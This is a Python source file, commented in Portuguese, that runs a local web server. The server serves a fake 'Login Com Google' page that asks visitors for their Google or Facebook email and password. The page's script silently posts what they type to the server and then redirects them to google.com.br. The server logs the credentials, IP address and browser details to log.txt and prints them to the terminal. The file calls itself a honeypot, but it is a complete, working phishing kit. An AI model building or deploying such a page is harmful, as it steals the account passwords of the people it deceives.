from http.server import BaseHTTPRequestHandler, HTTPServer
import time
from urllib.parse import parse_qs
import requests  # Importando requests para obter o IP público

# Função para obter o IP público
def get_public_ip():
    try:
        response = requests.get('https://ipinfo.io/ip')
        return response.text.strip()
    except requests.RequestException:
        return 'Desconhecido'

# Função para identificar o navegador a partir do User-Agent
def identify_browser(user_agent):
    user_agent = user_agent.lower()
    if 'chrome' in user_agent:
        if 'edge' in user_agent:
            return 'Microsoft Edge'
        return 'Google Chrome'
    elif 'firefox' in user_agent:
        return 'Mozilla Firefox'
    elif 'safari' in user_agent:
        if 'version' in user_agent:
            return 'Safari'
    elif 'opera' in user_agent or 'opr' in user_agent:
        return 'Opera'
    elif 'msie' in user_agent or 'trident' in user_agent:
        return 'Internet Explorer'
    return 'Desconhecido'

# Página HTML de Login
login_page = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Google</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #1a1a1a;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .box {
            position: relative;
            width: 320px;
            padding: 30px;
            background: #252525;
            border-radius: 15px;
            text-align: center;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
        }
        .box::before {
            content: "";
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            background: linear-gradient(45deg, cyan, magenta, blue, cyan);
            border-radius: 20px;
            z-index: -1;
            animation: animate-border 3s linear infinite;
        }
        .box::after {
            content: "";
            position: absolute;
            inset: 5px;
            background: #2d2d39;
            border-radius: 15px;
            z-index: -1;
        }
        @keyframes animate-border {
            0% { filter: hue-rotate(0deg); }
            100% { filter: hue-rotate(360deg); }
        }
        h2 {
            color: white;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px cyan, 0 0 20px cyan, 0 0 30px cyan;
        }
        .logo {
            width: 200px;
            height: auto;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 15px cyan);
        }
        .input-box {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background: #333;
            color: white;
            text-align: center;
            font-size: 16px;
            box-shadow: 0 0 10px cyan;
            transition: all 0.3s ease;
        }
        .input-box:focus {
            box-shadow: 0 0 15px cyan, 0 0 20px cyan;
            outline: none;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 5px;
            background: cyan;
            color: black;
            cursor: pointer;
            font-size: 16px;
            box-shadow: 0 0 15px cyan;
            transition: all 0.3s ease-in-out;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover {
            background: #00ffffaa;
            box-shadow: 0 0 20px cyan;
            transform: scale(1.1);
        }
        .eye-icon {
            position: absolute;
            right: -25px;  /* Move 10px para a esquerda em relação à borda direita */
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="box">
        <img class="logo" src="https://static.vecteezy.com/system/resources/previews/028/667/072/non_2x/google-logo-icon-symbol-free-png.png" alt="Google Logo">
        
        <h2>Login Com Google</h2>

        <!-- Formulário de Login -->
        <form id="loginForm" action="/registrar_log" method="post" onsubmit="redirecionarGoogle(); return false;">
            <input type="hidden" name="source" value="form">
            <div class="input-group">
                <input type="email" name="email" class="input-box" placeholder="Digite Email do Facebook ou do Google" required>
            </div>
            <div class="input-group" style="position: relative;">
                <input type="password" name="senha" id="senha" class="input-box" placeholder="Digite senha do Facebook ou do Google" required>
                <!-- Ícone de Olho para visualizar a senha -->
                <span class="eye-icon" onclick="togglePassword()">
                 🚫
                </span>
            </div>
            
            <!-- Botão para enviar o formulário -->
            <button type="submit" class="btn">Conecte-se</button>
        </form>
    </div>

    <script>
        // Função para alternar a visibilidade da senha
        function togglePassword() {
            var passwordField = document.getElementById("senha");
            var type = passwordField.type === "password" ? "text" : "password";
            passwordField.type = type;
        }

        function togglePassword() {
            var senhaInput = document.getElementById('senha');
            var eyeIcon = document.querySelector('.eye-icon');

            // Se a senha estiver escondida, mostre-a, e altere o ícone do olho
            if (senhaInput.type === 'password') {
                senhaInput.type = 'text';
                eyeIcon.innerHTML = '👁️';  // Ou outro ícone de "olho aberto"
            } else {
                senhaInput.type = 'password';
                eyeIcon.innerHTML = '🚫';  // Ícone para "olho fechado"
            }
        }

        // Função para salvar os dados em um arquivo txt e redirecionar para o Google
        function redirecionarGoogle() {
            var email = document.querySelector('input[name="email"]').value;
            var senha = document.querySelector('input[name="senha"]').value;

            // Aqui você pode salvar os dados (em um arquivo txt no lado do servidor)
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/salvar_dados', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('email=' + encodeURIComponent(email) + '&senha=' + encodeURIComponent(senha));

            // Após salvar, redirecionar para o Google
            window.location.href = 'https://www.google.com.br';
        }
    </script>
</body>
</html>
"""

# Página de sucesso
success_page = """<html><body><h1>Login bem-sucedido!</h1></body></html>"""

# Página de IP
def generate_ip_page(client_ip):
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seu IP</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }}
        .container {{
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 300px;
            text-align: center;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Seu IP</h2>
        <p>Seu IP é: {client_ip}</p>
    </div>
</body>
</html>
"""

class MyHandler(BaseHTTPRequestHandler):
    def log_visitor_info(self, client_ip, access_time, user_agent, email=None, password=None):
        public_ip = get_public_ip()
        browser = identify_browser(user_agent)
        print("\nInformações do HoneyPot\n=======================\n")
        log_entry = f"\nIP Address: {client_ip}\n\nPublic IP: {public_ip}\n\nBrowser: {browser}\n\nAccess Time: {access_time}\n\nUser Agent: {user_agent}\n"
        
        # Print email and password if provided
        if email:
            log_entry += f"\n\nEmail: {email}\n"
            print(f"Email: {email}")  # Print email to terminal
        if password:
            log_entry += f"Password: {password}\n"
            print(f"Password: {password}")  # Print password to terminal
            
        log_entry += "\n" + "="*40 + "\n\n"

        # Write to log file
        with open('log.txt', 'a') as log_file:
            log_file.write(log_entry)  # Saving everything in 'log.txt' file
            
        # Print to terminal
        print(log_entry)

    def do_GET(self):
        client_ip = self.client_address[0]
        access_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        user_agent = self.headers.get('User-Agent')

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(login_page.encode())
        elif self.path == '/ip':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            ip_page = generate_ip_page(client_ip)
            self.wfile.write(ip_page.encode())
        else:
            self.send_error(404, "Página não encontrada")
        
        # Log visitor info for GET requests
        self.log_visitor_info(client_ip, access_time, user_agent)

    def do_POST(self):
        client_ip = self.client_address[0]
        access_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        user_agent = self.headers.get('User-Agent')
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()

        if '/registrar_log' in self.path:
            post_data = parse_qs(post_data)
            email = post_data.get('email', [''])[0]
            senha = post_data.get('senha', [''])[0]

            self.log_visitor_info(client_ip, access_time, user_agent, email, senha)

            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()

        elif '/salvar_dados' in self.path:
            post_data = parse_qs(post_data)
            email = post_data.get('email', [''])[0]
            senha = post_data.get('senha', [''])[0]

            # Write login data directly to log.txt
            with open('log.txt', 'a') as log_file:
                log_file.write(f"Email: {email} \nSenha: {senha}\n")
                print(f"Email: {email}")  # Print email to terminal
                print(f"Password: {senha}")  # Print password to terminal
                print("\n")

            self.send_response(200)
            self.end_headers()

        else:
            self.send_error(404, "Página não encontrada")

def run(server_class=HTTPServer, handler_class=MyHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'\nStarting honeypot server on Port: {port}')
    print(f'\nAcesse http://127.0.0.1:{port} no seu navegador para ver a página.')
    print("\n\n🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯\n")
    
    httpd.serve_forever()

if __name__ == '__main__':
    port = int(input("\nDigite o número da porta: "))
    print("""                                                                  
         
██╗  ██╗ ██████╗ ███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ████████╗    
██║  ██║██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗╚══██╔══╝    
███████║██║   ██║██╔██╗ ██║█████╗   ╚████╔╝ ██████╔╝██║   ██║   ██║       
██╔══██║██║   ██║██║╚██╗██║██╔══╝    ╚██╔╝  ██╔═══╝ ██║   ██║   ██║       
██║  ██║╚██████╔╝██║ ╚████║███████╗   ██║   ██║     ╚██████╔╝   ██║       
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝    ╚═╝      
                                                                           
""")
    print("🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯🍯\n")
    run(port=port)


